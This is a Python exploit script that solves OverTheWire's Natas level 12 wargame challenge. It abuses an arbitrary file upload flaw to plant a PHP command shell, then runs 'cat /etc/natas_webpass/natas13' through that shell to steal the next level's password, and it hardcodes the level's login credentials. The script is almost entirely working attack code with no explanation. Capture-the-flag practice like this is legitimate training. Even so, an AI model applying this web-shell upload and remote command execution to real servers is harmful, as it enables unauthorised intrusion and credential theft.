# Vulnerability: Arbitrary File Upload

import requests
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas12'
password = 'YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG'


# File & Data to be sent by POST request
files = {"uploadedfile": open("cmdshell.php", "rb")}
data = {"MAX_FILE_SIZE": "1000", "filename": "random.php", "submit": "Upload File"}


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Create a persistent session to maintain state across multiple requests
session = requests.Session()


# Perform a POST request to the specified URL with authentication credentials
resp = session.post(url=url, auth=(username, password), data=data, files=files)


# Parse the HTML content of the response using BeautifulSoup
soup = BeautifulSoup(resp.text, 'lxml')


# Command execution
if "has been uploaded" in str(soup.body):
    payload_url = soup.a.text
    resp = session.get(url=url + payload_url + "?cmd=cat /etc/natas_webpass/natas13", auth=(username, password))
    natas13_pass = resp.text.replace("GIF87a", "").strip()
    print(f"Natas 13: {natas13_pass}")
else:
	print("Error Occurred")
